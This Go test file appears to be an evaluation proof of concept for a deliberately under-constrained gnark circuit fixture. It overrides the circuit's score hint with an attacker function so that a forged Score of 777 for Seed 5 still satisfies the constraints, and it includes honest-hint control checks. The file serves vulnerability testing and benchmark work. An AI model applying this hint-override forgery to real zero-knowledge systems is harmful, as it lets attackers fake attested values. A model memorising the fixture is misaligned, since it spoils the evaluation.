// Eval PoC for the hint-raw fixture (gnark v0.14.0). run-pocs copies this into
// circuit/ of a sanitized scratch copy and runs `go test -run PoC_`.
package circuit

import (
	"math/big"
	"testing"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/r1cs"
)

var field = ecc.BN254.ScalarField()

// TestPoC_ScoreUnbound: the published Score is a free value. Overriding the
// hint to return an arbitrary number, unrelated to Seed, still solves, so the
// "Score is derived from Seed" claim is unproven (T-HINT-OVERRIDE).
func TestPoC_ScoreUnbound(t *testing.T) {
	ccs, err := frontend.Compile(field, r1cs.NewBuilder, &Attestation{})
	if err != nil {
		t.Fatal(err)
	}
	// Attacker claims Score 777 for Seed 5; the honest hint would give 6.
	w, err := frontend.NewWitness(&Attestation{Score: 777, Seed: 5}, field)
	if err != nil {
		t.Fatal(err)
	}
	evil := func(_ *big.Int, _, out []*big.Int) error { out[0].SetUint64(777); return nil }
	if _, err := ccs.Solve(w, solver.OverrideHint(solver.GetHintID(scoreHint), evil)); err != nil {
		t.Fatalf("attack: an arbitrary Score should satisfy the circuit: %v", err)
	}
	// Control: with the honest hint, Score 777 for Seed 5 is rejected.
	if _, err := ccs.Solve(w); err == nil {
		t.Fatal("control: honest hint gives Score 6, so 777 must be rejected")
	}
	// Sanity: honest Score for Seed 5 solves.
	ok, err := frontend.NewWitness(&Attestation{Score: 6, Seed: 5}, field)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := ccs.Solve(ok); err != nil {
		t.Fatalf("sanity: honest witness: %v", err)
	}
}
